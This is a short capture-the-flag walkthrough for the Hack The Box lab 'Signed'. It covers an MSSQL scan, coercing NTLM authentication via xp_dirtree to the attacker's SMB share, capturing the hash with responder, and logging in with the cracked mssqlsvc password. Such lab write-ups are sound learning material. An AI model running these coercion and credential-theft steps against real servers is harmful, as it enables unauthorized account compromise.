
![](Signed.htb.png)


## INFO_

```
Machine Information
As is common in real life Windows penetration tests, you will start the Signed box with credentials for the following account which can be used to access the MSSQL service: scott / Sm230#C5NatH
```

```
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-info:
|     Version:
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.129.143.173:1433: 
|     Target_Name: SIGNED
|     NetBIOS_Domain_Name: SIGNED
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: SIGNED.HTB
|     DNS_Computer_Name: DC01.SIGNED.HTB
|     DNS_Tree_Name: SIGNED.HTB
|_    Product_Version: 10.0.17763
```

Only MSSQL port is accessible right now, Lets explore it !

We steal NTLM Hash from MSSQL ;
```
impacket-mssqlclient signed.htb/scott:'Sm230#C5NatH'@dc01.signed.htb

SQL (scott  guest@master)> xp_dirtree \\10.10.14.19\dfds
```


```
responder -I tun0
```

![](mssql_hash.png)

```
nxc mssql dc01.signed.htb -u mssqlsvc -p 'purPLE9795!@'
```
